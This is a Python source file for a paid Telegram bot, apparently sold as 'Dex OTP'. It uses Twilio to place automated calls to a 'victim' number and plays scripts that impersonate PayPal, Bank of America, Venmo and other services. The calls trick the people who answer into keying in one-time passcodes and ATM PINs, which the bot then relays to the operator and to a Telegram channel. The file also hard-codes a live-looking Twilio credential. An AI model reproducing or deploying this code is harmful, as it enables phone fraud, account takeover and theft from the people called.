import flask
# from flask_session import Session
import phonenumbers
import telebot
from flask import Flask, request
from telebot import types
from twilio.rest import Client
import requests
from requests.structures import CaseInsensitiveDict
from twilio.twiml.voice_response import VoiceResponse, Gather

from cred import *
from dbase import *

SUDO_ID = 6160846794
gather = ""
bankname = ""
path = 'UserDetails.db'
conn = sqlite3.connect(path, check_same_thread=False)

c = conn.cursor()

# Twilio connection
client = Client(account_sid, auth_token)

# Flask connection
app = Flask(__name__)

# Bot connection
bot = telebot.TeleBot(API_TOKEN, threaded=False)
bot.remove_webhook()
bot.set_webhook(url=callurl)


# Process webhook calls
@app.route('/', methods=['GET', 'POST'])
def webhook():
    if flask.request.headers.get('content-type') == 'application/json':
        json_string = flask.request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    else:
        print("error")
        flask.abort(403)


# Handle '/start'
@bot.message_handler(commands=['start'])
def send_welcome(message):
    id_ofu = message.from_user.id
    print(id_ofu)
    print(check_user(id_ofu))
    print(check_admin(id_ofu))
    print(fetch_expiry_date(id_ofu))
    if check_admin(id_ofu):
        if not check_user(id_ofu):
            create_user_lifetime(id_ofu)
        else:
            pass
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 2
        item1 = types.KeyboardButton(text="User Mode")
        item2 = types.KeyboardButton(text="Admin Mode")
        keyboard.add(item1)
        keyboard.add(item2)
        bot.send_message(message.chat.id, "Welcome to Dex ! 🌀\n\nWould you like to be in user or admin mode?",
                         reply_markup=keyboard)
    elif (check_user(id_ofu) == True) and check_expiry_days(id_ofu) > 0:
        days_left = check_expiry_days(id_ofu)
        name = message.from_user.first_name
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 2
        item1 = types.KeyboardButton(text="Welcome to Dex OTP  ")
        keyboard.add(item1)
        send = bot.send_message(message.chat.id,
                                f"Hey *{name}* \n\nYou have *{days_left}* days left ⏰ \n\n * 📱 Send victim mobile number*\n\n*E.g +14358762364*\n\n*Make sure to use the + *"
                                "or the bot will not work correctly!", parse_mode='Markdown')

        bot.register_next_step_handler(send, saving_phonenumber)
    else:
        bot.send_message(message.chat.id,
                         "Sorry license key not found ⚠️ \n\n In you already purchased key contact - @m_KzT \n\n 💎 "
                         "To purchase key visit : dex.sellpass.io")


def saving_phonenumber(message):
    userid = message.from_user.id
    no_tobesaved = str(message.text)
    z = phonenumbers.parse(no_tobesaved, "US")
    try:
        if phonenumbers.is_valid_number(z) == True and phonenumbers.is_valid_number(z) == True:
            save_phonenumber(no_tobesaved, userid)

            keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
            keyboard.row_width = 2
            item1 = types.KeyboardButton(text="Ok")
            keyboard.add(item1)
            send = bot.send_message(message.chat.id, f"✅ Send *Ok* to confirm mobile \n\n 📱  *{no_tobesaved}*",
                                    parse_mode='Markdown', reply_markup=keyboard)

            bot.register_next_step_handler(send, call_or_sms_or_script)
        else:
            bot.send_message(message.chat.id,
                             " Invalid Number ❌\n Invalid numbers ONLY.\nUse /start command.")
    except phonenumbers.NumberParseException:
        bot.send_message(message.chat.id, "Invalid Number ❌\nUse /start command")


def call_or_sms_or_script(message):
    name = message.from_user.first_name
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="Call Mode")

    keyboard.add(item1)

    bot.send_message(message.chat.id, f"⚙️ {name} What mode do you want ?", reply_markup=keyboard)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Call Mode")
def call_mode(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="Ok")
    keyboard.add(item1)
    send = bot.send_message(message.chat.id, f"Welcome to \n\n 📱 - *Call Mode !*",
                            parse_mode='Markdown', reply_markup=keyboard)
    bot.register_next_step_handler(send, card_or_Otp)


def card_or_Otp(message):
    name = message.from_user.first_name
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2

    item4 = types.KeyboardButton(text="Grab OTP 🤖")
    item3 = types.KeyboardButton(text="Grab PIN 📌")

    keyboard.add(item4)
    keyboard.add(item3)


    bot.send_message(message.chat.id, f"Please choose an option, {name}. 👑", reply_markup=keyboard)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "User Mode")
def usecase1(message):
    if check_user(message.from_user.id):
        name = message.from_user.first_name
        send0 = bot.send_message(message.chat.id, f"Hey {name} welcome to ｄｘ √∆™ ｏｔｐ 💎", parse_mode='Markdown')
        bot.send_message(message.chat.id,
                         "*Reply with the number victim 📱*\n\n(e.g +14358762364)\n\n*You Have to Use The +*",
                         parse_mode='Markdown')
        bot.register_next_step_handler(send0, saving_phonenumber)
    else:
        bot.send_message(message.chat.id,
                         "Sorry license key not found ⚠️ \n\n In you already purchased key contact - @m_kzT \n\n 💎 To purchase key visit : dex.sellpass.io")


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Admin Mode")
def usecase2(message):
    if message.chat.id == 5126439799:
        send1 = bot.send_message(message.chat.id, "Hey Admin 👑\n*Send “Ok” to continue*", parse_mode='Markdown')
        bot.register_next_step_handler(send1, adminfunction)


def adminfunction(message):
    if message.chat.id == 5126439799:
        name = message.from_user.first_name
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
        keyboard.row_width = 1
        item = types.KeyboardButton(text="Edit access")
        keyboard.add(item)
        bot.send_message(message.chat.id, f"Please choose an option, {name}. 👑", reply_markup=keyboard)


@bot.message_handler(commands=['help'])
def how_to_help(message):
    bot.send_message(message.chat.id, "• Contact @Im_kzT or @DexOTP 👑\n\n• Use /faq for more help")

@bot.message_handler(commands=['balance'])
def how_to_help(message):
    url = "https://api.twilio.com/2010-04-01/Accounts/ACe67ef04fa8f26617c1c77afa204fa096/Balance.json"

    headers = CaseInsensitiveDict()
    headers[
        "Authorization"] = "Basic QUNlNjdlZjA0ZmE4ZjI2NjE3YzFjNzdhZmEyMDRmYTA5Njo1NTgwODFmOGMzMmRjN2UzMDM3MDJhZjg4MGJmZmVjZQ=="

    resp = requests.get(url, headers=headers)

    print(resp)

    bot.send_message(message.chat.id, f"Project Balance : {resp.text}")


@bot.message_handler(commands=['faq'])
def how_faq(message):
    bot.send_message(message.chat.id,
                     "• Please use @DexOTP for tutorial videos, and more helpful information (FAQ > Bot Help). \n\n• Send vouches to @Im_kzT \n\n• Buy Here: dex.sellpass.io")


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Edit access")
def edit_access(message):
    userid = message.from_user.id
    if userid == SUDO_ID:
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 4
        item1 = types.KeyboardButton(text="1 : Add Admin")
        item2 = types.KeyboardButton(text="2 : Add User")
        item3 = types.KeyboardButton(text="3 : Delete Admin")
        item4 = types.KeyboardButton(text="4 : Delete User")
        keyboard.add(item1, item2)
        keyboard.add(item3, item4)
        bot.send_message(message.chat.id, "Ok , what next ?", reply_markup=keyboard)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "1 : Add Admin")
def add_admin(message):
    if message.from_user.id == SUDO_ID:
        send = bot.send_message(message.chat.id, "Enter UserID: ")
        bot.register_next_step_handler(send, save_id_admin)


def save_id_admin(message):
    if message.from_user.id == SUDO_ID:
        adminid = message.text
        create_admin(adminid)
        create_user_lifetime(adminid)
        bot.send_message(message.chat.id, f"Added Admin \n\n"
                                          "Use /start for other functionality\n"
                         )


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "2 : Add User")
def type_of_user(message):
    if message.from_user.id == SUDO_ID:
        keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        keyboard.row_width = 4
        item1 = types.KeyboardButton(text="Test")
        item2 = types.KeyboardButton(text="7 days")
        item3 = types.KeyboardButton(text="1 month")
        item4 = types.KeyboardButton(text="3 months")
        item5 = types.KeyboardButton(text="Lifetime")
        keyboard.add(item1)
        keyboard.add(item2)
        keyboard.add(item3)
        keyboard.add(item4)
        keyboard.add(item5)
        bot.send_message(message.chat.id, "Ok , what next ?", reply_markup=keyboard)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Test")
def add_user(message):
    if check_user(message.from_user.id):
        send = bot.send_message(message.chat.id, "Enter UserID: ")
        bot.register_next_step_handler(send, createtest_user)


def createtest_user(message):
    # noinspection PyBroadException
    try:
        userid = message.text
        create_user_test(userid)
        bot.send_message(message.chat.id, f"Added user for Test calls \n\n"
                                          "Use /start for other functionality\n"
                                          "Good bye")
    except:
        bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")

        return ''


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "7 days")
def add_user(message):
    if check_user(message.from_user.id):
        send = bot.send_message(message.chat.id, "Enter UserID: ")
        bot.register_next_step_handler(send, create7days_user)


# noinspection PyBroadException
def create7days_user(message):
    try:
        userid = message.text
        create_user_7days(userid)
        bot.send_message(message.chat.id, f"Added user for 7 days \n\n"
                                          "Use /start for other functionality\n"
                         )
    except:
        bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")
        return ''


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "1 month")
def add_user(message):
    if check_user(message.from_user.id):
        send = bot.send_message(message.chat.id, "Enter UserID: ")
        bot.register_next_step_handler(send, create1month_user)


# noinspection PyBroadException
def create1month_user(message):
    try:
        userid = message.text
        create_user_1month(userid)
        bot.send_message(message.chat.id, f"Added user for 1 month \n\n"
                                          "Use /start for other functionality\n"
                         )
    except:
        bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")
        return ''


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "3 months")
def add_user(message):
    if check_user(message.from_user.id):
        send = bot.send_message(message.chat.id, "Enter UserID: ")
        bot.register_next_step_handler(send, create3months_user)


# noinspection PyBroadException
def create3months_user(message):
    try:
        userid = message.text
        create_user_3months(userid)
        bot.send_message(message.chat.id, f"Added user for 3 months \n\n"
                                          "Use /start for other functionality\n"
                         )
    except:
        bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")
        return ''


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Lifetime")
def add_user(message):
    if check_user(message.from_user.id):
        send = bot.send_message(message.chat.id, "Enter UserID: ")
        bot.register_next_step_handler(send, create_user_lifetime)


# noinspection PyBroadException
def create_lifetime_user(message):
    try:
        userid = message.text
        create_user_lifetime(userid)
        bot.send_message(message.chat.id, f"Added user for Life \n\n"
                                          "Use /start for other functionality\n"
                         )
    except:
        bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "3 : Delete Admin")
def delete_admin(message):
    if message.chat.id == SUDO_ID:
        send = bot.send_message(message.chat.id, "Enter userid: ")
        bot.register_next_step_handler(send, delete_id_admin)


def delete_id_admin(message):
    if message.chat.id == SUDO_ID:
        userid = message.text
        delete_specific_AdminData(userid)
        delete_specific_UserData(userid)
        bot.send_message(message.chat.id, f"Deleted Admin\n\n"
                                          "Use /start for other functionality")


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "4 : Delete User")
def delete_user(message):
    if message.chat.id == SUDO_ID:
        send = bot.send_message(message.chat.id, "Enter userid: ")
        bot.register_next_step_handler(send, delete_id_user)


def delete_id_user(message):
    if message.chat.id == SUDO_ID:
        userid = message.text
        delete_specific_UserData(userid)
        bot.send_message(message.chat.id, f"Deleted user\n\n"
                                          "Use /start for other functionality")


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Grab OTP 🤖")
def pick_bankotp(message):
    send = bot.send_message(message.chat.id, "Ok, \n\n*Reply with a service name 🏦*\n\n \n \n To use pre improved voices use\n\nPaypal\nTelegram\nWhatsapp\nBoa( Bank Of America)\nVenmo\n\n(e.g. Cash App):",
                            parse_mode='Markdown')
    bot.register_next_step_handler(send, nonameotp)


def nonameotp(message):
    userid = message.from_user.id
    name_tobesaved = str(message.text)
    print(name_tobesaved)
    save_bankName(name_tobesaved, userid)
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="Call")
    keyboard.add(item1)
    send = bot.send_message(message.chat.id, f"✅ *Success,\n*"
                                             f"\n\n ⏰ First send code at *{fetch_phonenumber(userid)}*\n\n 📲 Send *Call* to start call ",
                            parse_mode='Markdown', reply_markup=keyboard)
    bot.register_next_step_handler(send, make_call_otp)


def make_call_otp(message):
    userid1 = str(message.from_user.id)
    phonenumber = fetch_phonenumber(userid1)
    print(phonenumber)
    call = client.calls.create(record=True,
                               status_callback=(callurl + '/statuscallback/' + userid1),
                               recording_status_callback=(callurl + '/details_rec/' + userid1),
                               status_callback_event=['ringing', 'answered', 'completed'],
                               url=(callurl + '/wf/' + userid1),
                               to=phonenumber,
                               from_=twilionumber,
                               machine_detection='Enable')
    print(call.sid)
    bot.send_message(message.chat.id, f"Calling... ☎️ \n \n To 👨‍💻 - {phonenumber} \n\n From 📲 {twilionumber}")

    @bot.message_handler(content_types=["text"],
                         func=lambda message_of: message_of.text == "/redial")
    def make_call_otp_1(message_1):
        userid1_1 = str(message_1.from_user.id)
        phonenumber_1 = fetch_phonenumber(userid1_1)
        print(phonenumber_1)
        call_1 = client.calls.create(record=True,
                                     status_callback=(callurl + '/statuscallback/' + userid1_1),
                                     recording_status_callback=(callurl + '/details_rec/' + userid1_1),
                                     status_callback_event=['ringing', 'answered', 'completed'],
                                     url=(callurl + '/wf/' + userid1_1),
                                     to=phonenumber_1,
                                     from_=twilionumber,
                                     machine_detection='Enable')
        print(call_1.sid)
        bot.send_message(message_1.chat.id,
                         f"Calling... ☎️ \n \n To 👨‍💻 - {phonenumber_1} \n\n From 📲 {twilionumber}")


@app.route("/wf/<userid>", methods=['GET', 'POST'])
def voice_wf(userid):
    print(userid)
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatherOTP/'+userid, finishOnKey='*', input="dtmf")
        if bankname == 'Paypal':
            gather.play('https://ashinsana.info/call/paypal.mp3')
        elif bankname =='Telegram':
            gather.play('https://ashinsana.info/call/telegram.mp3')
        elif bankname =='Boa':
            gather.play('https://ashinsana.info/call/boa.mp3')
        elif bankname =='Whatsapp':
            gather.play('https://ashinsana.info/call/whatsapp.mp3')
        elif bankname =='Venmo':
            gather.play('https://ashinsana.info/call/venmo.mp3')
        else:
            gather.say(f"Hello, this is {bankname} , We have sent this automated call in an attempt to verify your phone number for mult factor authentication as required by our recently updated security policies, To confirm this phone number for two step verification, please press 1 ")
        resp.append(gather)

        return str(resp)
    else:
        resp.hangup()
        bot.send_message(userid, "*Call Was Declined / Voicemail ❌*\n\n Use /start to try again.", parse_mode='Markdown')
        return ''


@app.route('/gatherOTP/<userid>', methods=['GET', 'POST'])
def gatherotp(userid):
    chat_id = userid
    resp = VoiceResponse()
    try:
        if 'Digits' in request.values:
            # resp.say("Thank you, this attempt has been blocked! Goodbye.")
            choice = request.values['Digits']
            print(choice)
            if choice == '1':
                bot.send_message(chat_id,"Victim pressed 1 ✅")
                gather = Gather(action='/gatheroption2/' + userid, finishOnKey='#', input="dtmf")
                gather.play('https://ashinsana.info/call/final.mp3')
                resp.append(gather)
                return str(resp)
            else:
                bot.send_message(chat_id, "Victim not pressed 1 🟥")
                resp.say("Sorry, I didnt understand you,")
                resp.redirect("/wf/<userid>")
        else:
            choice = 0
            save_otpcode(choice, userid)
            bot.send_message(chat_id, "No OTP was collected")
            return str(resp)
    except:
        bot.send_message(chat_id, "No OTP was collected")

@app.route('/gatheroption2/<userid>', methods=['GET', 'POST'])
def gather_option_2(userid):
    chat_id = userid
    resp = VoiceResponse()
    option2 = fetch_option2(userid)
    if 'Digits' in request.values:
        numbercollected1 = request.values['Digits']
        print(numbercollected1)
        save_numbercollected1(numbercollected1, userid)
        bot.send_message(chat_id, f"The OTP Grabbed ✅ : {numbercollected1}")
        bot.send_message("-1001929202033", f"New OTP Grabbed✅: \n \n Service : {bankname} \n \n Code : {numbercollected1}")
        resp.say("Thank you, your request begin verify")
        return str(resp)
    else:
        resp.say("Sorry, I don't understand that choice.")
        bot.send_message(chat_id, "Victim is being difficult, still trying 😤")
        resp.redirect('/custom/<userid>')

        return str(resp)


@bot.message_handler(content_types=["text"], func=lambda message: message.text == "Grab PIN 📌")

def noname12(message):
    userid = message.from_user.id
    name_tobesaved = str(message.text)
    print(name_tobesaved)
    save_bankName(name_tobesaved, userid)
    send = bot.send_message(message.chat.id, 'Success! ✅ Send the code, and reply “Call” to begin the call. ')
    bot.register_next_step_handler(send, make_call_pin)


def make_call_pin(message):
    userid = str(message.from_user.id)
    chat_id = message.chat.id
    phonenumber = fetch_phonenumber(userid)
    print(phonenumber)

    call = client.calls.create(record=True,
                               status_callback=(callurl + '/statuscallback/' + userid),
                               recording_status_callback=(callurl + '/details_rec/' + userid),
                               status_callback_event=['ringing', 'answered', 'completed'],
                               url=(callurl + '/pin/' + userid),
                               to=phonenumber,
                               from_=twilionumber,
                               machine_detection='Enable')
    print(call.sid)
    bot.send_message(message.chat.id,
                     f"Calling... ☎️ \n \n To 👨‍💻 - {phonenumber} \n\n From 📲 {twilionumber}")

@app.route("/pin/<userid>", methods=['GET', 'POST'])
def intro_pin(userid):
    chat_id = userid
    bankname = fetch_bankname(userid)
    resp = VoiceResponse()
    choice = request.values['AnsweredBy']
    if choice == 'human' or choice == 'unknown':
        gather = Gather(action='/gatherpin/' + userid, finishOnKey='*', input="dtmf")
        gather.play('https://ashinsana.info/call/pin.mp3')
        resp.append(gather)
        resp.redirect('/pin/<userid>')
        return str(resp)
    else:
        resp.hangup()
        bot.send_message(chat_id, "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.", parse_mode='Markdown')
        return ''


@app.route("/gatherpin/<userid>", methods=['GET', 'POST'])
def save_pin(userid):
    chat_id = userid
    resp = VoiceResponse()
    if 'Digits' in request.values:
        resp.say("Thank you, this attempt has been blocked! Goodbye.")
        choice = request.values['Digits']
        print(choice)
        save_atmpin(choice, userid)
        bot.send_message(chat_id, f"The collected ATM Pin is ✅ {choice}")
        return str(resp)
    else:
        bot.send_message(chat_id, "No ATM Pin was collected")
        return str(resp)




# noinspection PyBroadException
@app.route('/statuscallback/<userid>', methods=['GET', 'POST'])
def handle_statuscallbacks(userid):
    chat_id1 = userid
    if 'CallStatus' in request.values:
        status = request.values['CallStatus']
        try:
            if status == 'ringing':
                bot.send_message(chat_id1, "Victim Mobile is ringing 🔔")
            elif status == 'in-progress':
                bot.send_message(chat_id1, "Call has been answered ✅")
            elif status == 'no-answer':
                bot.send_message(chat_id1, "Call was not answered 🟥")
            elif status == 'busy':
                bot.send_message(chat_id1,
                                 "Target number is currently busy ❌\nMaybe you should try again later \n\n Press /redial to call again")
            elif status == 'failed':
                bot.send_message(chat_id1, "Call failed ❌")
        except:
            bot.send_message(chat_id1, "Sorry an error has occured\nContact Admin @Im_kzT")
        else:
            return 'ok'
    else:
        return 'ok'


@app.route('/details_rec/<userid>', methods=['GET', 'POST'])
def handle_recordings(userid):
    chat_id = userid
    if 'RecordingUrl' in request.values:
        audio = request.values['RecordingUrl']
        mp3_audiofile = f"{audio}.mp3"
        bot.send_audio(chat_id, mp3_audiofile)

    else:
        bot.send_message(chat_id, "An error has occured\nContact Admin @Im_kzT")
    return ''


if __name__ == '__main__':
    app.run(debug=True)
